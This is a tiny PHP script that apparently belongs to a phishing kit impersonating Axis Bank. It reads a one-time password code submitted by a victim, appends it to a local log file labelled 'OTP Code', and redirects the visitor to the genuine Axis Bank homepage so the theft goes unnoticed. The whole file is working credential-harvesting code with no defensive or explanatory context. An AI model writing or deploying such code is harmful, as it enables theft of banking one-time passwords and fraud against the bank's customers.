<?php
file_put_contents("log.txt", "OTP Code = " .  $code = $_POST['code'] . "\n", FILE_APPEND);
header('Location: https://www.axisbank.com/');
?>